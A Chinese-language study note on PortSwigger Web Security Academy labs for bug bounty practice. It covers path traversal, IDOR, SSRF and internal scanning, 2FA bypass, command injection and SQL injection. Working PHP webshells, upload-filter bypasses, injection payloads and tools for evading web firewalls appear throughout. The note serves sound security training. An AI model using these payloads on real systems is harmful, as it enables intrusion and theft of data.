---
title: PortSwigger Day1 — Web 漏洞基础 14 Lab 通关
description: SRC 漏洞挖掘 — PortSwigger 靶场 Day1 学习笔记
---

# PortSwigger 学习笔记 Day1 — 2026-06-20

> 学习路径：Server-Side Vulnerabilities Apprentice
> 靶场：https://portswigger.net/web-security
> 环境：Win10 + Burp Suite Community | VPS 辅助

---

## 📋 今日完成 Lab 清单

| # | 模块 | Lab | 难度 | 核心技巧 |
|---|------|-----|:----:|---------|
| 1 | Path Traversal | File path traversal, simple case | 🟢 | `../`穿越读文件 |
| 2 | Access Control | Unprotected admin functionality | 🟢 | `/robots.txt`泄露管理路径 |
| 3 | Access Control | Unprotected admin functionality w/ unpredictable URL | 🟢 | JS源码搜隐藏路径 |
| 4 | Access Control | User role controlled by request parameter | 🟢 | 前端Cookie控制权限→提权 |
| 5 | Access Control | User ID controlled by request parameter w/ password disclosure | 🟢 | IDOR改ID参数窃取密码 |
| 6 | Authentication | Username enumeration via different responses | 🟢 | 错误信息差异枚举用户名 |

---

## 1️⃣ Path Traversal（路径穿越）

### 靶场
- **Lab**: [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple-case)

### 漏洞原理
Web 应用从用户传入的文件名参数（如 `/image?filename=12.jpg`）读取文件时，没有过滤 `../` 这类路径穿越序列。攻击者可以跳出限制目录，读取服务器任意文件。

### 实操步骤

```
① 打开靶场 → 商品列表页
② 点击一张商品图片，观察 URL 格式：
   /image?filename=12.jpg
③ 将 filename 参数改为路径穿越 payload：
   /image?filename=../../../etc/passwd
④ 浏览器返回破损图片（因为内容是文本，浏览器按图片渲染）
⑤ 查看响应内容的方式：
   - F12 → Network → 找到请求 → Response 选项卡
   - 或 Ctrl+U 查看页面源码
   - 或 Console 执行 fetch('/image?filename=../../../etc/passwd').then(r=>r.text()).then(console.log)
⑤ 通关：提交 /etc/passwd 路径
```

### 遇到的问题

| 问题 | 原因 | 解决 |
|------|------|------|
| 显示破损图片 | 浏览器把文本内容当图片渲染 | F12 看响应内容 / Ctrl+U / Console fetch |
| F12 Network 找不到请求 | 图片请求太快被清掉 | 先清日志再发请求 / 用 Console fetch |
| `fetch` 报 `ERR_HTTP2_PROTOCOL_ERROR` | 靶场短时间多次访问超时 | 换方式（Ctrl+U / curl） |

### 返回的敏感内容

```
root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
```

### 知识点
- `../` 代表上级目录，`../../` 上两级，Linux 一般 3 级到根
- 常用读取目标：`/etc/passwd`、`/etc/shadow`、配置文件、源码
- 浏览器对非图片内容显示为破损图标，**不代表没读到**

---

## 2️⃣ Unprotected admin functionality（未受保护的管理面板）

### 靶场
- **Lab**: [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)

### 漏洞原理
管理员后台没有做权限校验，任何人都可以直接访问。常见于：
- 开发者忘记加权限中间件
- 认为"/admin"路径没人知道（自以为安全）

### 实操步骤

```
① 打开靶场
② 尝试直接访问 /admin → 404
③ 访问 /robots.txt，看到：
   User-agent: *
   Disallow: /administrator-panel
   （robots.txt本意是禁止搜索引擎爬取，反而泄露了路径）
④ 访问 /administrator-panel → 进入后台
⑤ 点击 Delete carlos → 通关
```

### 关键命令
```bash
# curl 探测可访问路径
curl -s -o /dev/null -w "%{http_code}" "https://target.com/administrator-panel"

# 爆破常见管理路径
for path in admin administrator-panel adminpanel manage dashboard; do
  echo "/$path -> $(curl -s -o /dev/null -w '%{http_code}' "https://target.com/$path")"
done
```

### 知识点
- **robots.txt 可能泄露敏感路径**——SRC 信息泄露最常见的入口
- 常用管理面板路径字典：`/admin`, `/administrator-panel`, `/adminpanel`, `/manage`, `/dashboard`, `/admin-area`, `/backend`

---

## 3️⃣ Unprotected admin functionality w/ unpredictable URL（随机路径后台）

### 靶场
- **Lab**: [Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)

### 漏洞原理
虽然后台路径是随机的（如 `/admin-kqwamz`），但路径在**前端 JS 代码里写死了**。管理员登录后通过 JS 动态创建"Admin panel"链接。攻击者查看源码就能找到路径。

### 实操步骤

```
① 打开靶场
② 查看页面源码（Ctrl+U）或 F12
③ 搜索 "admin" 关键字，在 JS 代码中找到：
   <script>
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-kqwamz');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   </script>
④ 访问 /admin-kqwamz → 进入后台
⑤ Delete carlos → 通关
```

### 知识点
- **前端源码搜 `admin` 找隐藏后台**——SRC 常见技巧
- F12 搜索快捷键：`Ctrl+Shift+F`（全局搜索）/ `Ctrl+F`（当前文件搜索）
- 即使路径随机，写在 JS 里就等于公开

---

## 4️⃣ User role controlled by request parameter（Cookie/参数提权）

### 靶场
- **Lab**: [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)

### 漏洞原理
应用通过前端（Cookie/请求参数）控制用户角色，后端未做二次校验。攻击者只需修改 Cookie 值即可提权。

### 实操步骤

```
① 打开靶场 → 首页没有 Admin panel 链接（普通用户）
② F12 → Console 执行：
   document.cookie="Admin=true";location.reload()
③ 刷新后页面顶部出现 "Admin panel" 链接
④ 进入后台 → Delete carlos → 通关
```

### 遇到的问题

| 问题 | 原因 | 解决 |
|------|------|------|
| F12 → Application → Cookies 加 admin=true 无效 | Cookie名大小写敏感，写成小写 `admin` 了 | Cookie名必须是 `Admin`（大写A） |
| 手动加 Cookie 不生效 | Path 没设对 | `document.cookie="Admin=true"` 自动设置 Path=/ |

### 关键知识点
- **前端控制权限 = 漏洞**——这是 SRC 越权漏洞的高发类型
- Cookie名大小写敏感——必须和服务器校验一致
- `document.cookie="key=value"` 比手写 F12 更可靠（自动设好 Path/Domain）

### 常用提权参数名
```
Admin=true  |  admin=true  |  role=admin
isAdmin=true  |  user=admin  |  power=admin
```

---

## 5️⃣ User ID controlled by request parameter（IDOR 越权）

### 靶场
- **Lab**: [User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)

### 漏洞原理
查看用户信息时通过 URL 参数（`?id=xxx`）指定用户，但未校验当前登录用户是否有权限查看他人信息。典型 IDOR（Insecure Direct Object Reference）。

### 实操步骤

```
① 打开靶场 → 点击 "My account" → 登录页
② 默认账号：wiener / peter
③ 登录后 URL：/my-account?id=wiener
④ 将 id 改为 carlos：
   /my-account?id=carlos
⑤ 页面显示 carlos 的个人信息，包含密码
⑥ 复制密码 → 退出登录 → 用 carlos 账号登录
⑦ 看到 carlos 的账户页 → 通关
```

### 知识点
- **IDOR 是最容易出高危的漏洞之一**——改个参数就看到别人信息
- 找参数名：`id`, `user_id`, `uid`, `account`, `username`, `email`
- 常见利用场景：查看他人订单、个人信息、私信、支付记录

---

## 6️⃣ Username enumeration via different responses（错误信息枚举）

### 靶场
- **Lab**: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

### 漏洞原理
登录接口对"用户名不存在"和"密码错误"返回不同的提示信息，攻击者通过枚举找出有效用户名，再配合字典爆破密码。

### 实操步骤

```
① 打开靶场 → 访问 /login
② 随便输入一个不存在的用户名 → 返回 "Invalid username"
③ 换一个存在的用户名（但密码错误）→ 返回 "Incorrect password"
④ 利用这个差异，枚举找出有效用户
⑤ 对有效用户爆破密码 → 登录成功 → 通关
```

### 使用 Burp Intruder 枚举

```
① 浏览器挂 Burp 代理（127.0.0.1:8080）
② 在登录页提交一次登录请求
③ Burp 拦截请求 → 右键 Send to Intruder
④ Positions → Clear § → 选中 username 值 → Add §
⑤ Attack type: Sniper
⑥ Payloads → 粘贴用户名列表 → Start attack
⑦ 看 Length 列 → 不同长度的即有效用户
⑧ 固定用户名 → 对 password 设 payload → 爆破密码
⑨ 看 Status 列 → 302 的即为成功
```

### 爆破结果

| 项 | 值 |
|:---|:---|
| 有效用户名 | `autodiscover` |
| 密码 | `mobilemail` |
| 无效用户返回 | `Invalid username` |
| 有效用户+错密码 | `Incorrect password` |

### 知识点
- **错误信息的微妙差异 = 漏洞** —— 枚举用户名的经典手法
- 常见差异点：错误文本、响应长度、状态码、响应时间
- 爆破注意事项（实战中）：
  - 日志可查，WAF 会封 IP
  - 建议加延时 / 用代理池
  - 优先找非登录接口的爆破点

---

## 🔧 工具环境配置

### Burp Suite 安装（Win10）

```
① 官网下载 Community 版：https://portswigger.net/burp/communitydownload
② 安装 → 启动 → 选 Temporary project
③ 配置浏览器代理：
   - Burp: Proxy → Proxy Settings → 127.0.0.1:8080
   - 浏览器: 设置 → 代理 → 127.0.0.1:8080
④ 安装 HTTPS 证书（否则 https 页面报错）：
   - 浏览器访问 http://burpsuite → 下载 cacert.der
   - 双击 → 安装到"受信任的根证书颁发机构"
```

### Burp 核心功能速查

| 操作 | 位置 |
|:----|:-----|
| 开启/关闭拦截 | Proxy → Intercept → Intercept is on/off |
| 查看请求历史 | Proxy → HTTP history |
| 发送到 Intruder | 右键请求 → Send to Intruder |
| 设置爆破标记 | Intruder → Positions → Clear § → 选中值 → Add § |
| 加字典 | Intruder → Payloads → Payload configuration → Add |
| 开始攻击 | Start attack 按钮 / Ctrl+Enter |
| 重放改包 | 右键 → Send to Repeater |

> **注意**：Burp Community 版 Intruder 有速度限制，大量爆破建议用脚本（Python/curl）

---

## ❓ 封神台遗留问题

### 卡点：HttpOnly Cookie 无法读取

| 项目 | 说明 |
|:-----|:------|
| 靶场 | 封神台-尤里的复仇第五章 |
| 期望 | 存储型XSS窃取管理员Cookie → 登录后台 |
| 问题 | `ADMINSESSIONID` 标记为 **HttpOnly**，`document.cookie` 读不到 |
| 只拿到了 | `ASPSESSIONIDQQBRBTCC=...`（非 HttpOnly 的 ASP Session） |
| 缺了 | `ADMINSESSIONIDCSTRCSDQ=...`（HttpOnly，才是权限关键） |
| 尝试方案 | XSS 平台换多种 payload、自定义 AJAX fetch、CSRF 风格攻击 |
| 待解决 | HttpOnly Cookie 需用 XSS+CSRF 组合（让 bot 直接操作，不偷 Cookie） |

---

## 📌 总结

### 今天学到的 SRC 高产出漏洞类型

```
优先级:  信息泄露  >  IDOR/越权  >  SQL注入  >  XSS
         ⬆ 最容易出    ⬆ 高危最多   ⬆ 中危    ⬆ 中低危
```

### 核心思维
1. **错误信息差异 = 漏洞线索**
2. **前端控制的权限都不安全**（改Cookie/参数就能提权）
3. **robots.txt 和 JS 源码是信息泄露的宝藏**
4. **改 ID 参数看别人信息 = IDOR（高危常客）**
5. **Burp 是核心工具，但 Community 版有速度限制**

---

---

## 7️⃣ 2FA simple bypass（两步验证绕过）

### 靶场
- **Lab**: [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)

### 漏洞原理
应用在登录后要求输入 2FA 验证码，但**没有校验用户是否真的完成了 2FA 验证**。攻击者登录后直接访问需要鉴权的页面，就能绕过两步验证。

### 实操步骤

```
① 打开靶场 → 登录页
② 使用默认账号登录：wiener / peter
③ 登录后跳转到 /login2（2FA 验证页）→ 需要输入验证码
④ 不输入验证码，直接修改地址栏为：
   /my-account
⑤ 直接进入用户后台 → 说明 2FA 形同虚设
⑥ Delete carlos → 通关
```

### 知识点
- **2FA 绕过往往不是因为验证码可破解，而是后端没有强制验证**
- 常见绕过方式：直接访问目标页面、改 Referer、修改响应状态码
- 检查 2FA 是否真正生效：登录后直接访问受保护的 URL

---

## 8️⃣ SSRF against local server（服务端请求伪造）

### 靶场
- **Lab**: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

### 漏洞原理
服务器从用户提供的 URL 获取数据（如查询库存），但没有校验 URL 的目标地址。攻击者可以让**服务器替自己访问内部系统**（localhost、内网 IP）。

### 实操步骤

```
① 打开靶场 → 点一个商品
② 发现有 "Check stock" 按钮，下拉选择（London/Paris/Milan）
③ F12 查看源码或抓包，看到：
   <select name="stockApi">
     <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1">London</option>
   </select>
④ Burp 抓 Check stock 请求 → 改 stockApi 参数为：
   stockApi=http://localhost/admin/delete?username=carlos
⑤ 或者 F12 Console 直接发：
   fetch('/product/stock', {method:'POST', body:'stockApi=http://localhost/admin/delete?username=carlos'}).then(r=>r.text()).then(console.log)
⑥ 服务器替我们访问内部 admin 接口 → delete carlos → 通关
```

### 遇到的问题

| 问题 | 原因 | 解决 |
|------|------|------|
| F12 Network 看不到请求 | 页面在打开 F12 前已加载完，历史请求不显示 | F12 → 刷新页面（F5）即可 |
| SSRF 返回 302 跳转 | 服务器替我们删除成功，返回重定向 | 直接检查是否通关 |

### curl 版（VPS 辅助）
```bash
curl -s "https://靶场URL/product/stock" \
  -d "stockApi=http://localhost/admin/delete?username=carlos"
```

### 知识点
- **SSRF 是高危漏洞**——利用服务器访问内网/本地资源
- 常见参数名：`url`、`api`、`stockApi`、`file`、`path`、`redirect`
- 常见利用：读云服务元数据（AWS `169.254.169.254`）、打内网 Redis/MongoDB
- 可配合其他漏洞：从 SSRF 到 RCE、从 SSRF 到内网横向移动

---

---
*持续更新中... 全14Lab通关 ✅*

---

## 9️⃣ SSRF — 内网扫描找后台

### 靶场
- **Lab**: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend)

### 漏洞原理
SSRF 扫描内网段，服务器可以访问到外部不可达的内部主机。利用 stockApi 参数扫描 192.168.0.0/24 的 8080 端口，找到真实的管理后台地址。

### 实操步骤

```
① 点 Check stock → Burp 拦截请求
② stockApi 指向 http://192.168.0.1:8080/product/stock/check?...
③ Burp Intruder 扫 IP 段：
   - Positions → Clear § → 选中 IP 最后一个数字 → Add §
   - stockApi=http://192.168.0.§1§:8080/admin
   - Attack type: Sniper
   - Payloads → Numbers → 1-255 Step 1
   - 注意：路径改为 /admin 而非 /product/stock/check
④ 找到 192.168.0.110:8080 返回 302 → 有 admin 面板
⑤ 改 stockApi=http://192.168.0.110:8080/admin/delete?username=carlos
⑥ Forward → 通关 ✅
```

### 关键知识点

- **Burp Intruder 不止用来爆破用户名密码**，还可以扫端口、扫内网 IP
- Community 版慢是正常的，正式用上脚本
- **Repeater 用途**：修改单次请求反复调试，不改原始包

---

## 🔟 File Upload — WebShell 上传（无验证）

### 靶场
- **Lab 1**: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- **Lab 2**: [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

### 漏洞原理
文件上传功能没有对上传文件做有效验证，或验证方式可以绕过（如 Content-Type 检查），导致攻击者可以上传可执行脚本（PHP/ASP/JSP）并获取服务器权限。

### Webshell 变种对比

| 代码 | 访问方式 | 特点 |
|:----|:---------|:-----|
| `<?php echo file_get_contents('/home/carlos/secret'); ?>` | 直接访问 | 硬编码目标路径，一次任务 |
| `<?php system($_GET['cmd']); ?>` | `shell.php?cmd=id` | **传参型**，一次上传任意命令 |
| `<?php system($_REQUEST['c']); ?>` | `shell.php?c=id` | GET/POST 都支持 |
| `<?= `ls -la` ?>` | 直接访问 | PHP 短标签+反引号 |
| `<?= @eval($_POST['a']); ?>` | POST 传参 | 一句话木马，配合蚁剑 |

### 实操步骤

```
Lab 1（无验证）:
① 登录 wiener/peter
② My account → 上传头像
③ 创建 shell.php: <?php system($_GET['cmd']); ?>
④ 访问 /files/avatars/shell.php?cmd=cat /home/carlos/secret
⑤ 拿到 secret → 提交通关 ✅

Lab 2（Content-Type 绕过）:
① 上传 shell.php → 报错"只允许 image/jpeg"
② Burp 拦截上传请求
③ 找到 Content-Type: application/octet-stream
④ 改成 Content-Type: image/jpeg
⑤ Forward → 上传成功 ✅
```

### 遇到的问题

| 问题 | 原因 | 解决 |
|:----|:------|:-----|
| 上传后显示"上传失败"但仍可访问 | 服务器先存文件后校验 | 文件实际已落地，不管错误提示直接访问 |
| 反引号 `ls -la` 返回空 | 服务器禁用了 shell_exec | 换用 system() 或 passthru() |

### 关键知识点

- **Content-Type 检查 = 前端可控**，Burp 改一下就行
- 上传后永远先去页面看头像的 `<img src>` 确定存储路径
- **传参型 webshell 最实用**：一次上传，后续任意操作
- 上传失败但文件还能访问 = 存储-检查时序漏洞

---

## 1️⃣1️⃣ OS Command Injection（命令注入）

### 靶场
- **Lab**: [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

### 漏洞原理
应用将用户输入拼接进系统命令时没有做转义/过滤，攻击者通过管道符 `|`、分号 `;` 等拼接自己的命令。

### 实操步骤

```
① 点商品 → Check stock
② Burp 拦截到 POST /product/stock
③ 请求体为 productId=2&storeId=1
④ 改为 productId=2&storeId=1|whoami
⑤ Forward → 响应返回 peter-7dt7xb ✅
```

### 命令注入管道符速查

```
|whoami      → 管道拼接（无视前面输出）
;whoami     → 分号拼接
$(whoami)   → 命令替换（输出作为参数）
`whoami`    → 反引号命令替换
||whoami    → 或逻辑（前面失败才执行）
&whoami     → 后台执行
```

### 关键知识点

- **每个输入点都值得试管道符** — 不管看起来是不是"只能数字"
- 命令注入是 RCE（远程代码执行）的一种——高危
- 后续可以弹 shell、反弹连接、横向移动

---

## 1️⃣2️⃣ SQL Injection — WHERE 子句隐藏数据

### 靶场
- **Lab**: [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-sqli-retrieve-hidden-data)

### 漏洞原理
SQL 语句拼接用户输入时，未过滤特殊字符。通过 `' OR 1=1--` 改变 SQL 逻辑，返回本不该显示的数据。

### SQL 注入判断三步法

```
步骤1：'            → 500/报错       → 存在注入点 ✅
步骤2：' OR 1=1--   → 多出数据       → 注入成立 ✅
步骤3：' AND 1=1--  → 正常
       ' AND 1=2--  → 空/报错       → 布尔注入确认 ✅
```

### 实操步骤

```
① 浏览商品分类 /filter?category=Accessories
② 加单引号测试：category=Accessories' → 500 报错
③ 注入：category=Accessories' OR 1=1-- → 显示所有隐藏商品 ✅
④ 通关
```

### 单引号反应的三种含义

| 现象 | 说明 |
|:----|:------|
| `'` → 500报错 | 注入点存在 ✅ |
| `'` → 正常显示 | 可能不是注入点，或参数是数字型 |
| `'` → 正常但页面有变化 | 可能被转义了 |

**数字型参数测试法**：`id=1 AND 1=1` vs `id=1 AND 1=2`

---

## 1️⃣3️⃣ SQL Injection — 登录绕过

### 靶场
- **Lab**: [SQL injection login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

### 漏洞原理
登录 SQL：`SELECT * FROM users WHERE username='xxx' AND password='xxx'`，用户名注入单引号闭合 + `--` 注释掉密码校验。

### 实操步骤

```
① 打开 /login
② 用户名输入：administrator'--
③ 密码随便填 → 登录成功 ✅
```

### 原理拆解

```sql
-- 原始 SQL（猜）：
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'xxx'

-- -- 注释了后面的 AND，相当于：
SELECT * FROM users WHERE username = 'administrator'
```

### 关键知识点

- `'--` 是最经典的登录绕过 payload
- 注意需要带单引号闭合前面的字符串
- PortSwigger 默认管理员用户名是 `administrator`（小写）

---

## 📌 总总结 — Day1 通关回顾

### 通关 14 个 Lab

| # | 模块 | Lab | 核心技巧 |
|---|:----|:----|:--------|
| 1 | Path Traversal | 路径穿越读 /etc/passwd | `../../../etc/passwd` |
| 2 | Access Control | 未保护管理面板 | `/robots.txt` → `/administrator-panel` |
| 3 | Access Control | 随机路径后台 | JS 源码搜 admin |
| 4 | Access Control | Cookie 提权 | `Admin=true` |
| 5 | Access Control | IDOR 密码泄露 | 改 `id=carlos` |
| 6 | Authentication | 用户名枚举 | 错误信息差异 |
| 7 | Authentication | 2FA 绕过 | 直接访问 /my-account |
| 8 | SSRF | 本机 SSRF | `stockApi=http://localhost/admin` |
| 9 | SSRF | 内网扫描 | Intruder 扫 192.168.0.0/24 |
| 10 | File Upload | 无验证上传 | webshell + system($_GET['cmd']) |
| 11 | File Upload | Content-Type 绕过 | 改 image/jpeg |
| 12 | OS Command Inj | Check stock 注入 | `\|whoami` |
| 13 | SQL Injection | 隐藏数据 | `OR 1=1--` |
| 14 | SQL Injection | 登录绕过 | `administrator'--` |

### SRC 漏洞优先级（实战排序）

```
高产出:  信息泄露 > IDOR/越权 > SQL注入 > SSRF > 文件上传
         ⬆ 最容易出  ⬆ 高危最多
         
中低产:  命令注入 > XSS
         遇到算赚
```

### 核心思维模型

1. **每个参数都值得测** — 地址栏、表单、Cookie、Header，处处都可能
2. **错误信息 = 宝藏** — 报错告诉你"这里有漏洞"
3. **从外部看内部** — SSRF 让服务器替你打内网
4. **从前端到后端** — 前端控制的权限/类型都不可信
5. **Burp 是核心工具** — 拦截→改包→Forward→Repeater→Intruder 记死
6. **F12 补充** — Network 看请求、Console 发 fetch、检查看元素

### 今天的最佳实践

```
Burp 套路：
  Intercept is on → 操作 → 改包 → Forward → Intercept is off

F12 套路：
  Network → All → F5 刷新 → 看请求/响应
  Console → fetch/post → .then(r=>r.text()).then(console.log)
  
Webshell 套路：
  上传 → 传参型（system($_GET['cmd'])）→ 用 URL 参数跑命令
```


---

## 📖 知识点深度扩展

---

### 🔥 扩展一：一句话木马（WebShell）完全解析

#### 什么是 webshell

Webshell 本质上就是一段**放在服务器上的代码**，通过 HTTP 请求触发执行系统命令。一句话木马 = 最短的 webshell，通常就 1 行代码。

#### 常见 PHP webshell 变种

| 类型 | 代码 | 调用方式 | 优点 | 缺点 |
|:----|:-----|:---------|:-----|:-----|
| **GET 传参** | `<?php system($_GET['cmd']); ?>` | `shell.php?cmd=id` | 最直观，浏览器地址栏就能用 | 命令出现在 URL 日志 |
| **POST 传参** | `<?php system($_POST['cmd']); ?>` | POST 发 `cmd=id` | 命令在请求体，日志不记录 | 需要工具/脚本发 POST |
| **REQUEST 传参** | `<?php system($_REQUEST['c']); ?>` | GET/POST 都行 | 灵活 | 同上 |
| **Cookie 传参** | `<?php system($_COOKIE['c']); ?>` | Cookie: c=id | 最隐蔽，不出现在 body/URL | 需要改 Cookie |
| **经典一句话** | `<?php @eval($_POST['a']); ?>` | POST发 `a=system('id')` | 蚁剑/冰蝎标准格式 | 只能执行 PHP 代码 |
| **短标签版** | `<?= @eval($_POST['a']); ?>` | 同上 | 更短 | 需要开启 short_open_tag |

#### GET 传参型（最实用）

```php
<?php system($_GET['cmd']); ?>
```

一行搞定，浏览器地址栏直接操作：

```
/files/avatars/shell.php?cmd=id
/files/avatars/shell.php?cmd=ls -la
/files/avatars/shell.php?cmd=whoami
/files/avatars/shell.php?cmd=cat /etc/passwd
```

#### 一句话木马 + 管理工具

实战中不用手动敲命令，而是用**管理工具**连上 webshell：

| 工具 | 特点 | 适用场景 |
|:----|:-----|:---------|
| **蚁剑 (AntSword)** | 开源免费，PHP/ASP/JSP 全支持 | 日常首选 |
| **冰蝎 (Behinder)** | 流量加密，动态密钥 | 过 WAF 过流量审计 |
| **哥斯拉 (Godzilla)** | 多种编码，payload 多样化 | 对抗流量检测 |

配合蚁剑的一句话木马标准格式：

```php
<?php @eval($_POST['a']); ?>
```

上传后，蚁剑里填 URL + 密码 `a` → 连上就是文件管理器 + 虚拟终端。

#### webshell 的防御绕过技巧

```
1. Content-Type 绕过   → 改成 image/jpeg（我们刚练过）
2. 扩展名双写绕过     → shell.pphphp（过滤 php 但双写绕过）
3. 图片马              → 图片尾部追加 PHP 代码（要配合文件包含）
4. 大小写绕过         → shell.Php / shell.pHp
5. .htaccess 绕过     → 上传 .htaccess 让 .jpg 当作 PHP 执行

实战中最常见防御：Content-Type 检查、文件头检查、扩展名检查
Content-Type 最好绕 → Burp 改一行就行
扩展名检查需要用双写/大小写绕过
文件头检查需要图片马
```

---

### 🔥 扩展二：IDOR（越权）深度解析

#### 什么是 IDOR

**Insecure Direct Object Reference** — 不安全的直接对象引用。

简单说：**服务器直接拿你提供的 ID 去查数据，没检查你有没有权限看。**

#### IDOR 的本质

```
用户 → 请求 /my-account?id=xxx
                     ↓
            服务器："哦，他要 id=xxx 的数据"
                     ↓
            没问"你配看吗？"就去查数据库
                     ↓
            SELECT * FROM users WHERE id='xxx'
                     ↓
            返回数据（不管你是不是这个用户）
```

#### 最容易出现 IDOR 的参数名大全

```
id  |  user_id  |  uid  |  account  |  username
email  |  order  |  order_id  |  invoice  |  bill_id
file  |  doc_id  |  ticket  |  msg_id  |  comment_id
```

#### IDOR 实战检测四种场景

```
场景1：URL 参数
  /user/profile?id=123         →  改成 124 看别人的
  /api/order/ORD-001           →  改 ORD-002

场景2：POST body
  {"userId": "wiener"}         →  改成 {"userId": "carlos"}

场景3：接口未授权
  /api/admin/users             →  没登录直接访问？返回用户列表？

场景4：隐藏字段
  看页面 <input type="hidden" name="userId" value="123">
  改这个值再提交 → 可能越权
```

#### IDOR 在 SRC 中的价值

```
SRC 中 IDOR = 【高危/严重】漏洞

能看别人订单    → 泄露姓名/地址/手机号
能看别人余额    → 金融信息泄露
能改别人密码    → 账号劫持
能删别人数据    → 破坏

挖洞三步走：找参数 → 改参数 → 看返回
IDOR 是最容易出高危的方向之一
```

---

### 🔥 扩展三：SQL 注入原理深度

#### WHERE 子句注入 — 后台实际发生了什么

```sql
-- 你点的 Accessories 分类：
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
-- released = 1 = 已发布（released = 0 = 隐藏商品）

-- 你注入 OR 1=1-- 后：
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
-- 变成本质上等于：
SELECT * FROM products WHERE category = 'Accessories' OR 1=1
-- 1=1 永远为真 → 返回所有商品（包括隐藏的）
```

#### 登录绕过 — 后台实际发生了什么

```sql
-- 原始逻辑：
SELECT * FROM users WHERE username = 'xxx' AND password = 'xxx'
-- 只有用户名密码都对 → 返回用户记录 → 登录成功

-- 你输入 administrator'-- 后：
SELECT * FROM users WHERE username = 'administrator'--' AND password = '123'
-- -- 是 SQL 注释，后面的 AND password 被吃掉了
-- 等价于：
SELECT * FROM users WHERE username = 'administrator'
-- 只要 administrator 存在 → 直接登录成功（密码形同虚设）
```

#### UNION 注入（下个阶段学）

```sql
-- 猜列数（ORDER BY）：
' ORDER BY 1--   → 正常
' ORDER BY 2--   → 正常
' ORDER BY 3--   → 正常
' ORDER BY 4--   → 报错 → 只有 3 列

-- UNION 查数据：
' UNION SELECT 1,2,3--              → 看到数字显示在页面上（找到回显位）
' UNION SELECT username,password,3 FROM users--  → 拖出所有用户账号密码
```

#### 盲注（无回显情况）

页面不显示数据内容，只有"是/否"两种状态时：

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--  → 正常
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--  → 报错
...
一个一个字符猜，或 Burp Intruder 自动跑
```

---

### 🔥 扩展四：Burp vs F12 全面对比

#### 对比总结

| 功能 | Burp Suite | F12 (DevTools) |
|:----|:-----------|:---------------|
| **拦截请求** | ✅ Intercept is on 拦住 | ❌ 拦不住，只能看历史 |
| **改包再发** | ✅ 改了再 Forward | ❌ 不能改原始请求 |
| **重放调试** | ✅ Repeater 反复改 | ✅ Console 发 fetch |
| **批量爆破** | ✅ Intruder | ❌ 需要额外脚本 |
| **看请求历史** | ✅ HTTP history | ✅ Network 标签 |
| **看响应** | ✅ 各种格式 | ✅ 各种格式 |
| **修改响应** | ✅ 可以改响应内容 | ❌ 不能改 |
| **上手难度** | 🟡 要配置代理 | 🟢 开箱即用 |

#### Burp Intercept 正确用法

```
正常浏览时：  Intercept is off   → 浏览器请求直达服务器
想改包时：    Intercept is on    → 请求被拦住 → 改包 → Forward
改完继续：    Intercept is off   → 恢复正常浏览

⚠️ 不要一直开着 Intercept is on！
它会拦住每一个请求（包括图片/CSS/JS），导致页面加载不出来
```

#### F12 Console fetch 用法速查

```javascript
// GET 请求
fetch('/api/user?id=123').then(r=>r.text()).then(console.log)

// POST 请求（表单格式）
fetch('/login', {method:'POST', body:'username=admin&password=123'}).then(r=>r.text()).then(console.log)

// POST 请求（JSON 格式）
fetch('/api/update', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:123})}).then(r=>r.text()).then(console.log)

// 看响应头 + 响应体
fetch('/admin').then(r=>{console.log(r.status, r.headers); return r.text()}).then(console.log)
```

---

### 🔥 扩展五：HTTP 请求结构速查

一个 HTTP 请求长这样：

```
POST /login HTTP/1.1                     ← 请求行（方法 + 路径 + 协议版本）
Host: target.com                         ← 请求头
Cookie: session=abc123                   ← 请求头
Content-Type: application/x-www-form-urlencoded
                                         ← 空行（分隔头与体）
username=admin&password=123              ← 请求体（POST 才有）
```

**每个部分都可能存在漏洞：**

```
请求行  → 路径穿越      /image?filename=../../../etc/passwd
请求头  → Cookie 提权   Admin=true
请求头  → 绕过检查      Content-Type: image/jpeg
请求体  → SQL 注入      username=admin'--
请求体  → 命令注入      storeId=1|whoami
请求体  → SSRF          stockApi=http://localhost/admin
```

**HTTP 方法含义：**

```
GET     → 获取数据（参数在 URL）    /user?id=123
POST    → 提交数据（参数在 body）
PUT     → 更新数据
DELETE  → 删除数据
```

**状态码速记：**

```
200 OK           → 请求成功 ✅
301/302 Found    → 重定向（登录成功常见）
401 Unauthorized → 没登录
403 Forbidden    → 没权限（但有这个资源）
404 Not Found    → 找不到（资源不存在或故意隐藏）
500 报错         → 服务器内部错误（SQL 注入报错就是它）
```

---

### 🔥 扩展六：SRC 实战思维 — 拿到一个站先测什么

#### 信息收集先行

```
1. robots.txt        → 找隐藏路径 / 管理员后台
2. JS 源码搜关键词   → admin / api / secret / token / key
